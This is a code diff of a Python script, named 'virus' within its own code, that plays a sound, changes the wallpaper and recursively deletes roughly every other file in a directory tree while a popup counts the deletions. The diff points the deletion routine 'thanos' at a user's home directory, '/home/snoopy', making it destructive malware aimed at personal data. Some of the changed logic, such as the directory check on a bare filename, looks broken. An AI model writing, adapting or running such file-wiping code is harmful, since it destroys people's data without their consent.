@@ -24,16 +24,16 @@ def popUp():
     root.overrideredirect(True)
 
     width, height = root.winfo_screenwidth(), root.winfo_screenheight()
-    x = 300
-    y = 300
+    x = 990 - 500/2
+    y = 500 - 50/2
     root.geometry('500x50+%d+%d' % (x, y))
 
     frame = tk.Frame(root, width=500, height=50, bg='black')
     frame.grid(row=0, column=0, sticky="NW")
 
-    font = ("Ani", 20, "bold")
+    font = ("Arial", 20, "bold")
 
-    label = tk.Label(root, text='%d       %d' % (deleted_files, scanned_files), bg='black', fg='white', font= font)
+    label = tk.Label(root, text='deleted: %d       left: %d' % (deleted_files, scanned_files-deleted_files), bg='black', fg='white', font= font)
     label.place(relx=0.5, rely=0.5, anchor="center")
 
     #label.pack()
@@ -46,23 +46,23 @@ def bgSound():
     playsound('bgSound.mp3',0)
 
 
-async def thanos(dossier):
+async def thanos(dossier, delete_count = 0):
     
     global deleted_files
     global scanned_files
-    delete_count = 0
 
-    for nom_fichier in os.scandir(dossier):
-        if nom_fichier.name != 'virus':
-            if nom_fichier.is_dir():
-                await thanos(nom_fichier.path)
+    for nom_fichier in os.listdir(dossier):
+        if nom_fichier != 'virus':
+            path_file = os.path.join(dossier, nom_fichier);
+            if os.path.isdir(nom_fichier):
+                await thanos(path_file, delete_count)
             else:
                 if delete_count % 2 == 0:
                     try:
-                        os.chmod(nom_fichier.path, 0o644)
-                        os.remove(nom_fichier.path)
+                        # os.chmod(path_file, 0o644)
+                        os.remove(path_file)
                         deleted_files += 1
-                        print('delete ' + nom_fichier.path)
+                        print('delete ' + path_file)
                     except:
                         print('Mixmax')
                 scanned_files += 1
@@ -72,7 +72,7 @@ async def thanos(dossier):
 async def main():
     bgSound()
     wallpaper(0)
-    task = asyncio.create_task(thanos('../'))
+    task = asyncio.create_task(thanos('/home/snoopy'))
     await asyncio.sleep(5)
     wallpaper(1)
     await asyncio.sleep(5)
